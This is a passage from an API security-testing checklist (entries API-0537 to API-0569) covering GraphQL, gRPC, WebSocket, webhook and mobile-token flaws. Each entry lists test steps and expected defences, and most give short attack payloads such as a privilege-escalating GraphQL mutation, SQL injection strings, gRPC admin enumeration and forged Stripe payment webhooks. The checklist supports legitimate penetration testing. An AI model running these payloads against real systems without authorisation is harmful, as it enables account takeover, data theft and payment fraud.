**References:** Apollo persisted-queries security; GRAPHQL TESTING_GUIDE §15; OWASP API8; API8:2023 Security Misconfiguration

---

## API-0537 — GraphQL BFLA via privileged mutation as low-priv
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sensitive mutations (setRole / createApiKey / deleteUser / impersonate) — missing @auth directive

**Test Steps:** 1. Enumerate mutations from schema / field suggestions<br>2. As low-priv A, invoke privileged mutations<br>3. Read back to confirm the effect persisted<br>4. Identify the missing @auth/@hasRole directive gap

**Expected Result:** Every sensitive mutation enforces role/permission server-side (directive or resolver)

**Payload / PoC Example:**

```
mutation{ setUserRole(userId:"me",role:ADMIN){ id role } }
```

**Impact:** GraphQL BFLA -&gt; privileged mutation by low-priv user -&gt; priv-esc / ATO

**Tools:** Burp Suite, InQL, graphql-cop

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); GRAPHQL TESTING_GUIDE §8; OWASP API5; GraphQL BFLA directive-gap; API5:2023 Broken Function Level Authorization

---

## API-0538 — GraphQL batch-alias BOLA mass-extraction
**Phase:** 13-GraphQL · **Category:** GraphQL · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Aliased batched query on node(id:) / *ById resolvers

**Test Steps:** 1. Build one query aliasing the same object field N times with different IDs<br>2. Send as A; harvest many objects in a single request<br>3. Combine with an ID-leak for UUIDs<br>4. Quantify records pulled per request (also a rate-limit bypass)

**Expected Result:** Object resolvers authorize per node AND batching/complexity limits apply

**Payload / PoC Example:**

```
{ a:user(id:"1"){email} b:user(id:"2"){email} c:user(id:"3"){email} }
```

**Impact:** Alias batching turns BOLA into single-request bulk exfiltration + rate-limit bypass

**Tools:** Burp Suite, CrackQL, batch_ratelimit_test.py

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); GRAPHQL TESTING_GUIDE §7/§9; OWASP API1; alias-batching research; API1:2023 Broken Object Level Authorization

---

## API-0539 — Field-suggestion leakage
**Phase:** 13-GraphQL · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** POST Error responses / verbose output / metadata

**Test Steps:** 1. Send query with mistyped field name<br>2. Server replies 'Did you mean...' revealing valid fields<br>3. Use clairvoyance to enumerate full schema

**Expected Result:** Disable suggestions in production

**Payload / PoC Example:**

```
{user(id:1){passw}} -> 'Did you mean password'
```

**Impact:** Schema leak when introspection disabled

**Tools:** clairvoyance,graphql-cop

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0540 — Field-level authz missing
**Phase:** 13-GraphQL · **Category:** Security Misconfiguration · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Query password mfaSecret internalNotes salary<br>2. Test as different roles<br>3. Confirm leak

**Expected Result:** Per-resolver authz checks

**Payload / PoC Example:**

```
{user(id:1){password mfaSecret}}
```

**Impact:** Sensitive data leak

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API1:2023 Broken Object Level Authorization

---

## API-0541 — Mutation without authn
**Phase:** 13-GraphQL · **Category:** Security Misconfiguration · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Send mutation { deleteUser(id:1) } without Authorization<br>2. Verify destruction

**Expected Result:** Require auth on mutations

**Payload / PoC Example:**

```
mutation{deleteUser(id:1)}
```

**Impact:** Destructive unauth action

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API5:2023 Broken Function Level Authorization

---

## API-0542 — gRPC admin RPC accessible to user
**Phase:** 14-gRPC · **Category:** BFLA · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Privileged/admin function endpoint

**Test Steps:** 1. grpcurl -plaintext -H 'authorization: Bearer USER' -d '{}' target svc.AdminService/GetAllUsers<br>2. Verify response

**Expected Result:** Authz per RPC; admin on internal port only

**Payload / PoC Example:**

```
grpcurl ... AdminService/GetAllUsers
```

**Impact:** Privilege escalation

**Tools:** grpcurl

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API5:2023 Broken Function Level Authorization

---

## API-0543 — gRPC method enumeration via server reflection
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. grpcurl -plaintext target:443 list<br>2. Describe each service<br>3. Invoke admin methods as user

**Expected Result:** Disable reflection in production

**Payload / PoC Example:**

```
grpcurl -plaintext target.com:443 list
```

**Impact:** Method enumeration -&gt; BFLA

**Tools:** grpcurl

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0544 — Protobuf field fuzzing
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Send negative ints / huge ints / wrong type / oversize bytes<br>2. Look for crashes / parser errors / IDOR

**Expected Result:** Strict proto validation

**Payload / PoC Example:**

```
-d '{"id":-1}' / -d '{"id":"admin"}'
```

**Impact:** DoS / IDOR

**Tools:** grpcurl,ghz

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0545 — gRPC Method Exposure
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. List available methods<br>2. Access internal methods<br>3. Test

**Expected Result:** Control should be enforced; abuse rejected/logged

**Payload / PoC Example:**

```
N/A (methodology / recon step)
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** Burp Suite

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0546 — gRPC Method Enumeration via Reflection
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Check if gRPC server reflection enabled<br>2. Use grpc_cli or grpcurl to list services<br>3. Enumerate internal/admin methods

**Expected Result:** gRPC server reflection disabled in production

**Payload / PoC Example:**

```
grpcurl -plaintext target:443 list
grpcurl -plaintext target:443 describe .AdminService
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** grpcurl, grpc_cli

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0547 — gRPC Injection in Protobuf Fields
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Intercept gRPC request via Burp gRPC plugin<br>2. Inject SQL/NoSQL payloads in string fields<br>3. Check for injection in underlying query

**Expected Result:** All protobuf string fields validated and parameterized before DB queries

**Payload / PoC Example:**

```
Inject: name = "admin' OR '1'='1'--" in protobuf string field
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** Burp gRPC plugin, grpcurl

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0548 — gRPC Replay Attack via Stream Manipulation
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Capture gRPC stream with Burp<br>2. Replay bidirectional stream messages<br>3. Check if actions executed multiple times

**Expected Result:** Stream messages include nonce; replay detected server-side

**Payload / PoC Example:**

```
Replay captured gRPC streaming payment request
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** Burp Suite gRPC plugin

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0549 — gRPC Reflection Service Exposure
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Connect to gRPC endpoint<br><br>2. Query reflection service<br><br>3. Enumerate available services and methods<br><br>4. Map attack surface

**Expected Result:** Should disable reflection in production

**Payload / PoC Example:**

```
grpcurl -plaintext host:port list
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** grpcurl

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0550 — gRPC Metadata Injection
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Intercept gRPC request<br><br>2. Inject malicious metadata values<br><br>3. Exploit metadata processing<br><br>4. Bypass security controls

**Expected Result:** Should validate all metadata values

**Payload / PoC Example:**

```
Inject SQL/command in metadata header
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** mitmproxy

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0551 — gRPC Message Size Attack
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Send oversized gRPC message<br><br>2. Exceed expected message limits<br><br>3. Cause memory exhaustion<br><br>4. Monitor server stability

**Expected Result:** Should enforce message size limits

**Payload / PoC Example:**

```
Send 100MB+ protobuf message
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** Custom Script

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0552 — gRPC Stream Exhaustion
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** gRPC methods / server reflection

**Test Steps:** 1. Open multiple gRPC streams<br><br>2. Keep streams open without completing<br><br>3. Exhaust server stream capacity<br><br>4. Cause DoS

**Expected Result:** Should limit concurrent streams

**Payload / PoC Example:**

```
Open 10000 concurrent streams
```

**Impact:** gRPC reflection/auth flaws; method enumeration &amp; access bypass

**Tools:** Custom Script

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API4:2023 Unrestricted Resource Consumption

---

## API-0553 — gRPC-web / JSON transcoding gateway authz drift
**Phase:** 14-gRPC · **Category:** gRPC · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** gRPC-JSON transcoding gateway (Envoy / grpc-gateway) vs native gRPC method layer

**Test Steps:** 1. Identify a REST-&gt;gRPC transcoding gateway<br>2. Compare authz on the REST facade vs calling the gRPC method directly (grpcurl)<br>3. Try methods not exposed via REST but reachable on the gRPC port<br>4. Bypass edge rules by speaking native gRPC / grpc-web-text

**Expected Result:** Authorization enforced at the gRPC method layer, not only the REST facade

**Payload / PoC Example:**

```
grpcurl -plaintext target:50051 list ; grpcurl -plaintext target:50051 package.Service/AdminMethod
```

**Impact:** Transcoding authz drift -&gt; reach gRPC methods the REST edge protected

**Tools:** grpcurl, grpc-web tools, Burp

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); gRPC security (reflection/transcoding); OWASP API5; API5:2023 Broken Function Level Authorization

---

## API-0554 — Cross-Site WebSocket Hijacking
**Phase:** 15-WebSocket · **Category:** CSRF · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** State-changing endpoint under cookie auth

**Test Steps:** 1. Confirm WS authn via cookie not protocol token<br>2. Build attacker.com PoC opening wss://target/ws and exfilling messages<br>3. Visit page as victim

**Expected Result:** Validate Origin; use token in protocol

**Payload / PoC Example:**

```
new WebSocket('wss://target/ws') from attacker page
```

**Impact:** Real-time data theft -&gt; ATO

**Tools:** Burp WS,wscat

**References:** -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger Academy CSRF; OWASP CSRF Prevention Cheat Sheet; API2:2023 Broken Authentication

---

## API-0555 — WebSocket message IDOR
**Phase:** 15-WebSocket · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Direct object reference (ID in path/param/body)

**Test Steps:** 1. Connect legitimate WS session<br>2. Modify message {"action":"getOrder","id":victim}<br>3. Verify victim data returned

**Expected Result:** Per-message authz

**Payload / PoC Example:**

```
{"action":"getOrder","id":2}
```

**Impact:** Cross-user data leak

**Tools:** Burp WS

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0556 — Injection via WS messages
**Phase:** 15-WebSocket · **Category:** WebSocket · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebSocket handshake (Origin) &amp; messages

**Test Steps:** 1. Submit SQLi/NoSQLi/SSTI/Cmd payloads in message body<br>2. Look for errors / OOB callbacks

**Expected Result:** Validate WS messages

**Payload / PoC Example:**

```
{"action":"search","query":"' OR '1'='1"}
```

**Impact:** SQLi / RCE via WS

**Tools:** Burp WS

**References:** -&gt;[WebSocket checklist](#/checklist/websocket); Christian Schneider CSWSH; PortSwigger Academy WebSockets; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0557 — WebSocket Message Injection
**Phase:** 15-WebSocket · **Category:** WebSocket · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebSocket handshake (Origin) &amp; messages

**Test Steps:** 1. Connect to WebSocket<br>2. Send malicious payloads<br>3. Test for injection

**Expected Result:** Should validate WebSocket messages

**Payload / PoC Example:**

```
XSS/SQLi payloads via WebSocket
```

**Impact:** CSWSH / missing origin checks hijack the socket session

**Tools:** Burp Suite

**References:** -&gt;[WebSocket checklist](#/checklist/websocket); Christian Schneider CSWSH; PortSwigger Academy WebSockets; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0558 — WebSocket Message Replay Attack
**Phase:** 15-WebSocket · **Category:** WebSocket · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebSocket handshake (Origin) &amp; messages

**Test Steps:** 1. Capture legitimate WebSocket messages (actions)<br>2. Replay captured buy/transfer/vote messages<br>3. Check if idempotency enforced

**Expected Result:** WebSocket messages include nonce/timestamp; replay detected and rejected

**Payload / PoC Example:**

```
Replay: {"action":"transfer","amount":1000,"to":"attacker"} (captured message)
```

**Impact:** CSWSH / missing origin checks hijack the socket session

**Tools:** Burp Suite

**References:** -&gt;[WebSocket checklist](#/checklist/websocket); Christian Schneider CSWSH; PortSwigger Academy WebSockets; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0559 — WebSocket Origin Validation Bypass
**Phase:** 15-WebSocket · **Category:** WebSocket · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebSocket handshake (Origin) &amp; messages

**Test Steps:** 1. Connect from different origin<br><br>2. Spoof Origin header<br><br>3. Check if connection accepted<br><br>4. Access protected WebSocket API

**Expected Result:** Should validate Origin header strictly

**Payload / PoC Example:**

```
Origin: https://attacker.com
```

**Impact:** CSWSH / missing origin checks hijack the socket session

**Tools:** Burp Suite

**References:** -&gt;[WebSocket checklist](#/checklist/websocket); Christian Schneider CSWSH; PortSwigger Academy WebSockets; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0560 — WebSocket Cross-Site Hijacking
**Phase:** 15-WebSocket · **Category:** WebSocket · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebSocket handshake (Origin) &amp; messages

**Test Steps:** 1. Create malicious page that connects to WebSocket<br><br>2. Victim visits attacker page<br><br>3. Hijack victim's WebSocket session<br><br>4. Execute commands as victim

**Expected Result:** Should implement CSRF protection for WebSocket

**Payload / PoC Example:**

```
Malicious HTML page with WebSocket connection
```

**Impact:** CSWSH / missing origin checks hijack the socket session

**Tools:** Custom Script

**References:** -&gt;[WebSocket checklist](#/checklist/websocket); Christian Schneider CSWSH; PortSwigger Academy WebSockets; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0561 — Webhook signature missing or weak
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Webhook/callback URL configuration

**Test Steps:** 1. Inspect webhook signing scheme<br>2. Submit forged event to /webhook<br>3. Check if accepted as authoritative

**Expected Result:** HMAC-verify body and timestamp; nonce; rotate keys

**Payload / PoC Example:**

```
Forged JSON without valid HMAC
```

**Impact:** Free goods / fake state

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0562 — Webhook no nonce / no timestamp -&gt; replay
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Webhook/callback URL configuration

**Test Steps:** 1. Capture legitimate webhook<br>2. Replay later<br>3. Verify duplicate processing

**Expected Result:** Reject old timestamps; nonce store

**Payload / PoC Example:**

```
Replay legit webhook 24h later
```

**Impact:** Duplicate fulfillment

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0563 — Stripe/Braintree Webhook Signature Bypass
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment/Transaction — Webhook/callback URL configuration

**Test Steps:** 1. Intercept payment provider webhook<br>2. Remove or forge webhook signature header<br>3. Send fake payment success event

**Expected Result:** Webhook signature validated using HMAC; requests without valid signature rejected

**Payload / PoC Example:**

```
POST /webhooks/stripe  (Stripe-Signature header removed or forged)
```

**Impact:** Webhook SSRF/spoofing; internal access &amp; forged events

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0564 — Webhook Signature Bypass
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook/callback URL configuration

**Test Steps:** 1. Capture legitimate webhook payload<br><br>2. Modify payload content<br><br>3. Keep or remove signature<br><br>4. Check if server validates signature

**Expected Result:** Should validate webhook signatures

**Payload / PoC Example:**

```
Modified payload without valid HMAC signature
```

**Impact:** Webhook SSRF/spoofing; internal access &amp; forged events

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0565 — Webhook Replay Attack
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Webhook/callback URL configuration

**Test Steps:** 1. Capture legitimate webhook<br><br>2. Replay exact same webhook later<br><br>3. Check if processed again<br><br>4. Abuse duplicate processing

**Expected Result:** Should implement idempotency and timestamp validation

**Payload / PoC Example:**

```
Replay captured webhook request
```

**Impact:** Webhook SSRF/spoofing; internal access &amp; forged events

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0566 — Webhook Source Spoofing
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook/callback URL configuration

**Test Steps:** 1. Identify webhook endpoint<br><br>2. Craft fake webhook from attacker IP<br><br>3. Spoof expected source headers<br><br>4. Trigger unauthorized actions

**Expected Result:** Should validate source IP or use signatures

**Payload / PoC Example:**

```
Fake webhook from attacker server
```

**Impact:** Webhook SSRF/spoofing; internal access &amp; forged events

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0567 — Webhook Event Injection
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Webhook/callback URL configuration

**Test Steps:** 1. Identify webhook event types<br><br>2. Craft webhook with manipulated event type<br><br>3. Trigger unintended processing<br><br>4. Exploit event handling logic

**Expected Result:** Should validate event types strictly

**Payload / PoC Example:**

```
{""event"":""admin.user_created""} when only user events allowed
```

**Impact:** Webhook SSRF/spoofing; internal access &amp; forged events

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0568 — Stripe Webhook Signature Bypass
**Phase:** 16-Webhook · **Category:** Webhook · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Payment/Transaction — Webhook/callback URL configuration

**Test Steps:** 1. Intercept Stripe webhook POST request<br>2. Remove or forge Stripe-Signature header<br>3. Send fake payment_intent.succeeded event<br>4. Check if order is fulfilled without real payment

**Expected Result:** Webhook signature validated using HMAC-SHA256 with Stripe webhook secret

**Payload / PoC Example:**

```
# Original legitimate webhook
POST /webhooks/stripe HTTP/1.1
Stripe-Signature: t=1614556800,v1=abc123real_signature
{"type":"payment_intent.succeeded","data":{"object":{"amount":1000}}}

# Attack 1 – Remove signature header
POST /webhooks/stripe HTTP/1.1
[No Stripe-Signature header]
{"type":"payment_intent.succeeded","data":{"object":{"amount":1,"metadata":{"order_id":"ORD-9999"}}}}

# Attack 2 – Forge fake payment
{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":100,"currency":"usd","status":"succeeded","metadata":{"order_id":"TARGET_ORDER"}}}}

# Attack 3 – Replay old legitimate webhook
Stripe-Signature: t=OLD_TIMESTAMP,v1=OLD_VALID_SIG  (replay with extended tolerance window)

# Attack 4 – Test tolerance window (Stripe allows 300s by default)
Stripe-Signature: t=CURRENT_MINUS_400,v1=valid_old_sig
```

**Impact:** Webhook SSRF/spoofing; internal access &amp; forged events

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0569 — Insecure local storage of JWT
**Phase:** 17-Mobile · **Category:** JWT · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Inspect SharedPreferences / NSUserDefaults / Keychain<br>2. Look for plaintext tokens

**Expected Result:** Use Keystore / Keychain securely

**Payload / PoC Example:**

```
plaintext JWT in shared_prefs.xml
```

**Impact:** Token theft on rooted/jailbroken device

**Tools:** Frida,Objection

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API8:2023 Security Misconfiguration

---

## API-0570 — Cert pinning bypass for testing
